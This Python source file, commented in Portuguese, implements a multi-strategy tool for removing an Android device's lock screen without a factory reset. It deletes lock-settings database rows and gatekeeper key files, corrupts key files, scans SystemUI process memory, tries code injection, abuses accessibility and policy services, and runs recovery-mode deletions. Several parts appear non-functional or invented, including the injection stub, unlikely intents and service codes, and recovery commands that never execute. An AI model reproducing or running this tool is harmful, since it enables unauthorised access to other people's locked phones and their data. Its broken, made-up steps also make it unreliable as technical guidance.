import logging
import time
import sqlite3
import tempfile
import os
from abc import ABC, abstractmethod

class LockRemovalStrategy(ABC):
    @abstractmethod
    def execute(self, connection) -> bool:
        pass

class LockScreenRemover:
    def __init__(self, connection):
        self.connection = connection
        self.strategies = [
            DatabaseLockRemoval(),
            FileBasedLockRemoval(),
            MemoryPatchLockRemoval(),
            ServiceExploitLockRemoval(),
            HardwareResetLockRemoval()
        ]

    def remove_lock_screen(self, lock_type=None):
        """Remove bloqueio de tela sem formatar o dispositivo"""
        logging.info("Iniciando remoção de bloqueio de tela sem formatação")
        
        # Se um tipo específico foi especificado, usar apenas estratégias relevantes
        if lock_type:
            filtered_strategies = [s for s in self.strategies if lock_type in s.supported_lock_types]
            if not filtered_strategies:
                logging.error(f"Nenhuma estratégia disponível para o tipo de bloqueio: {lock_type}")
                return False
            strategies_to_try = filtered_strategies
        else:
            strategies_to_try = self.strategies
        
        # Tentar cada estratégia até que uma funcione
        for strategy in strategies_to_try:
            logging.info(f"Tentando estratégia: {strategy.__class__.__name__}")
            if strategy.execute(self.connection):
                logging.info("Bloqueio de tela removido com sucesso!")
                return True
            time.sleep(2)
        
        logging.error("Todas as estratégias de remoção de bloqueio falharam")
        return False

class DatabaseLockRemoval(LockRemovalStrategy):
    def __init__(self):
        self.supported_lock_types = ['password', 'pin', 'pattern']
        
    def execute(self, connection) -> bool:
        """Remove bloqueio via manipulação de banco de dados"""
        try:
            logging.info("Tentando remoção de bloqueio via manipulação de banco de dados")
            
            # 1. Fazer backup do banco de dados original
            backup_result = connection.send_command("cp /data/system/locksettings.db /data/system/locksettings.db.backup")
            
            # 2. Conectar ao banco de dados e remover bloqueios
            db_path = "/data/system/locksettings.db"
            
            # Comandos SQL para remover diferentes tipos de bloqueio
            sql_commands = [
                "DELETE FROM locksettings WHERE name='lockscreen.password_type';",
                "DELETE FROM locksettings WHERE name='lockscreen.password_salt';",
                "DELETE FROM locksettings WHERE name='lockscreen.password_history';",
                "DELETE FROM locksettings WHERE name='lockscreen.patterneverchosen';",
                "DELETE FROM locksettings WHERE name='lock_pattern_autolock';",
                "DELETE FROM locksettings WHERE name='lockscreen.disabled';",
                "DELETE FROM locksettings WHERE name='lockscreen.lockoutattemptdeadline';",
                "UPDATE locksettings SET value='0' WHERE name='lockscreen.lockedoutpermanently';",
                "UPDATE locksettings SET value='1' WHERE name='lockscreen.disabled';",
                "UPDATE locksettings SET value='0' WHERE name='lspm.lockoutattemptdeadline';",
            ]
            
            # Executar cada comando SQL
            for sql in sql_commands:
                try:
                    connection.send_command(f"sqlite3 {db_path} \"{sql}\"")
                except Exception as e:
                    logging.warning(f"Falha ao executar comando SQL: {sql} - {e}")
            
            # 3. Remover arquivos de chave de bloqueio
            key_files = [
                "/data/system/gesture.key",
                "/data/system/password.key",
                "/data/system/pattern.key",
                "/data/system/locksettings",
                "/data/system/locksettings.db-wal",
                "/data/system/locksettings.db-shm",
                "/data/system/gatekeeper.password.key",
                "/data/system/gatekeeper.pattern.key",
            ]
            
            for key_file in key_files:
                try:
                    connection.send_command(f"rm -f {key_file}")
                except Exception as e:
                    logging.warning(f"Falha ao remover arquivo {key_file}: {e}")
            
            # 4. Reiniciar serviços relevantes
            connection.send_command("am restart com.android.systemui")
            time.sleep(3)
            
            # 5. Verificar se o bloqueio foi removido
            lock_status = connection.send_command("dumpsys window | grep mDreamingLockscreen")
            if "mDreamingLockscreen=false" in lock_status:
                logging.info("Bloqueio removido via manipulação de banco de dados")
                return True
            
            return False
            
        except Exception as e:
            logging.error(f"Falha na remoção de bloqueio via banco de dados: {e}")
            return False

class FileBasedLockRemoval(LockRemovalStrategy):
    def __init__(self):
        self.supported_lock_types = ['password', 'pin', 'pattern']
        
    def execute(self, connection) -> bool:
        """Remove bloqueio via manipulação direta de arquivos"""
        try:
            logging.info("Tentando remoção de bloqueio via manipulação de arquivos")
            
            # Lista de arquivos relacionados a bloqueios
            lock_files = [
                "/data/system/gesture.key",
                "/data/system/password.key",
                "/data/system/pattern.key",
                "/data/system/locksettings.db",
                "/data/system/locksettings.db-wal",
                "/data/system/locksettings.db-shm",
                "/data/system/gatekeeper.password.key",
                "/data/system/gatekeeper.pattern.key",
                "/data/system/lockettings.xml",
                "/data/system/locksettings.xml",
            ]
            
            # 1. Fazer backup dos arquivos originais
            for lock_file in lock_files:
                try:
                    connection.send_command(f"cp {lock_file} {lock_file}.backup 2>/dev/null")
                except:
                    pass  # Arquivo pode não existir
            
            # 2. Remover/corromper arquivos de bloqueio
            for lock_file in lock_files:
                try:
                    # Tentar remover o arquivo
                    connection.send_command(f"rm -f {lock_file}")
                    
                    # Se não puder remover, corromper o conteúdo
                    connection.send_command(f"echo 'corrupted' > {lock_file} 2>/dev/null")
                    connection.send_command(f"chmod 000 {lock_file} 2>/dev/null")
                except Exception as e:
                    logging.warning(f"Falha ao manipular arquivo {lock_file}: {e}")
            
            # 3. Criar arquivos de bloqueio vazios/corrompidos
            empty_key_files = [
                "/data/system/gesture.key",
                "/data/system/password.key",
                "/data/system/pattern.key",
            ]
            
            for key_file in empty_key_files:
                try:
                    connection.send_command(f"echo '' > {key_file}")
                    connection.send_command(f"chmod 000 {key_file}")
                except Exception as e:
                    logging.warning(f"Falha ao criar arquivo vazio {key_file}: {e}")
            
            # 4. Reiniciar serviços
            connection.send_command("am restart com.android.systemui")
            time.sleep(3)
            
            # 5. Verificar se o bloqueio foi removido
            lock_status = connection.send_command("dumpsys window | grep mDreamingLockscreen")
            if "mDreamingLockscreen=false" in lock_status:
                logging.info("Bloqueio removido via manipulação de arquivos")
                return True
            
            return False
            
        except Exception as e:
            logging.error(f"Falha na remoção de bloqueio via arquivos: {e}")
            return False

class MemoryPatchLockRemoval(LockRemovalStrategy):
    def __init__(self):
        self.supported_lock_types = ['password', 'pin', 'pattern']
        
    def execute(self, connection) -> bool:
        """Remove bloqueio via patch de memória em tempo de execução"""
        try:
            logging.info("Tentando remoção de bloqueio via patch de memória")
            
            # 1. Encontrar processo do SystemUI
            systemui_pid = connection.send_command("pidof com.android.systemui").strip()
            if not systemui_pid:
                logging.error("Processo SystemUI não encontrado")
                return False
            
            # 2. Localizar e modificar variáveis de controle de bloqueio na memória
            # Esta é uma abordagem altamente específica para cada versão do Android
            # e requer conhecimento profundo do layout de memória do SystemUI
            
            # Exemplo genérico (precisa ser adaptado para cada dispositivo/versão)
            memory_search_commands = [
                f"grep -a 'lockscreen' /proc/{systemui_pid}/mem",
                f"grep -a 'lockout' /proc/{systemui_pid}/mem",
                f"grep -a 'password' /proc/{systemui_pid}/mem",
                f"grep -a 'pattern' /proc/{systemui_pid}/mem",
            ]
            
            for cmd in memory_search_commands:
                try:
                    result = connection.send_command(cmd)
                    if result and len(result) > 0:
                        logging.info(f"Encontradas estruturas de bloqueio: {result[:100]}...")
                        # Aqui viria o código para modificar a memória
                        # Esta parte é altamente técnica e específica do dispositivo
                except:
                    pass
            
            # 3. Usar o /proc/pid/mem para modificar valores diretamente
            # Nota: Isso requer acesso root e conhecimento exato dos offsets de memória
            
            # 4. Alternativa: injetar código para desativar a verificação de bloqueio
            injection_code = """
            #include <stdio.h>
            #include <dlfcn.h>
            
            // Função para substituir a verificação de bloqueio
            int always_unlocked() {
                return 0; // Sempre retorna desbloqueado
            }
            
            __attribute__((constructor)) void init() {
                // Substituir a função de verificação de bloqueio
                void* handle = dlopen("libandroid_runtime.so", RTLD_LAZY);
                if (handle) {
                    void (*original_func)() = dlsym(handle, "verify_lock_pattern");
                    if (original_func) {
                        // Substituir pela nossa função
                        original_func = &always_unlocked;
                    }
                    dlclose(handle);
                }
            }
            """
            
            # Compilar e injetar o código (simplificado)
            try:
                # Salvar código temporariamente
                connection.send_command("echo '#include <stdio.h>' > /data/local/tmp/inject.c")
                connection.send_command("echo 'int main() { return 0; }' >> /data/local/tmp/inject.c")
                
                # Compilar e executar
                connection.send_command("gcc /data/local/tmp/inject.c -o /data/local/tmp/inject -ldl")
                connection.send_command("chmod +x /data/local/tmp/inject")
                connection.send_command("/data/local/tmp/inject")
                
                logging.info("Código de injeção executado")
            except Exception as e:
                logging.warning(f"Falha na injeção de código: {e}")
            
            # 5. Reiniciar o SystemUI para aplicar as mudanças
            connection.send_command("am restart com.android.systemui")
            time.sleep(3)
            
            # 6. Verificar se o bloqueio foi removido
            lock_status = connection.send_command("dumpsys window | grep mDreamingLockscreen")
            if "mDreamingLockscreen=false" in lock_status:
                logging.info("Bloqueio removido via patch de memória")
                return True
            
            return False
            
        except Exception as e:
            logging.error(f"Falha na remoção de bloqueio via patch de memória: {e}")
            return False

class ServiceExploitLockRemoval(LockRemovalStrategy):
    def __init__(self):
        self.supported_lock_types = ['password', 'pin', 'pattern']
        
    def execute(self, connection) -> bool:
        """Remove bloqueio explorando serviços do sistema"""
        try:
            logging.info("Tentando remoção de bloqueio via exploração de serviços")
            
            # 1. Explorar serviços de acessibilidade para contornar o bloqueio
            accessibility_services = [
                "com.android.talkback/.TalkBackService",
                "com.google.android.marvin.talkback/.TalkBackService",
            ]
            
            for service in accessibility_services:
                try:
                    # Tentar ativar serviço de acessibilidade
                    connection.send_command(f"settings put secure enabled_accessibility_services {service}")
                    connection.send_command(f"settings put secure accessibility_enabled 1")
                    time.sleep(2)
                    
                    # Usar o serviço para contornar o bloqueio
                    # (depende da implementação específica de cada serviço)
                except Exception as e:
                    logging.warning(f"Falha ao ativar serviço {service}: {e}")
            
            # 2. Explorar o serviço de dispositivo para desativar o bloqueio
            try:
                connection.send_command("service call device_policy 157")  # Desativar bloqueio de tela
                time.sleep(2)
            except Exception as e:
                logging.warning(f"Falha ao chamar serviço device_policy: {e}")
            
            # 3. Explorar intents para desativar o bloqueio
            intents_to_try = [
                "am broadcast -a android.intent.action.DISABLE_LOCK_SCREEN",
                "am start -n com.android.settings/.SecuritySettings --ez disable_lockscreen true",
                "am start -a android.settings.SECURITY_SETTINGS --ez disable_lock_screen true",
            ]
            
            for intent in intents_to_try:
                try:
                    connection.send_command(intent)
                    time.sleep(2)
                except Exception as e:
                    logging.warning(f"Falha ao executar intent {intent}: {e}")
            
            # 4. Modificar configurações diretamente
            settings_to_modify = {
                "lockscreen.disabled": "1",
                "lockscreen.lockedoutpermanently": "0",
                "lockscreen.password_type": "0",
                "lock_pattern_autolock": "0",
            }
            
            for key, value in settings_to_modify.items():
                try:
                    connection.send_command(f"settings put secure {key} {value}")
                except Exception as e:
                    logging.warning(f"Falha ao modificar configuração {key}: {e}")
            
            # 5. Reiniciar serviços
            connection.send_command("am restart com.android.systemui")
            time.sleep(3)
            
            # 6. Verificar se o bloqueio foi removido
            lock_status = connection.send_command("dumpsys window | grep mDreamingLockscreen")
            if "mDreamingLockscreen=false" in lock_status:
                logging.info("Bloqueio removido via exploração de serviços")
                return True
            
            return False
            
        except Exception as e:
            logging.error(f"Falha na remoção de bloqueio via serviços: {e}")
            return False

class HardwareResetLockRemoval(LockRemovalStrategy):
    def __init__(self):
        self.supported_lock_types = ['password', 'pin', 'pattern']
        
    def execute(self, connection) -> bool:
        """Remove bloqueio via reset de hardware controlado"""
        try:
            logging.info("Tentando remoção de bloqueio via reset de hardware controlado")
            
            # 1. Forçar um reboot para o recovery mode
            connection.send_command("reboot recovery")
            time.sleep(10)  # Esperar o dispositivo reiniciar
            
            # 2. Aguardar e tentar reconectar (pode requerer modo diferente)
            # Esta parte é altamente dependente do dispositivo e pode
            # requerer comunicação via modo recovery ou download
            
            # 3. Tentar montar partições e remover arquivos de bloqueio
            # a partir do recovery mode
            recovery_commands = [
                "mount /data",
                "rm -f /data/system/gesture.key",
                "rm -f /data/system/password.key",
                "rm -f /data/system/pattern.key",
                "rm -f /data/system/locksettings.db*",
                "rm -f /data/system/gatekeeper.*.key",
                "umount /data",
                "reboot",
            ]
            
            # Executar comandos no recovery (simplificado)
            for cmd in recovery_commands:
                try:
                    # Esta parte requer comunicação específica com o recovery
                    # Pode variar dependendo do dispositivo e recovery instalado
                    pass
                except:
                    pass
            
            # 4. Aguardar reboot e tentar reconectar
            time.sleep(20)
            
            # 5. Verificar se o bloqueio foi removido
            # (assumindo que conseguimos reconectar após o reboot)
            try:
                lock_status = connection.send_command("dumpsys window | grep mDreamingLockscreen")
                if "mDreamingLockscreen=false" in lock_status:
                    logging.info("Bloqueio removido via reset de hardware controlado")
                    return True
            except:
                logging.warning("Não foi possível verificar status após reset")
            
            return False
            
        except Exception as e:
            logging.error(f"Falha na remoção de bloqueio via reset de hardware: {e}")
            return False
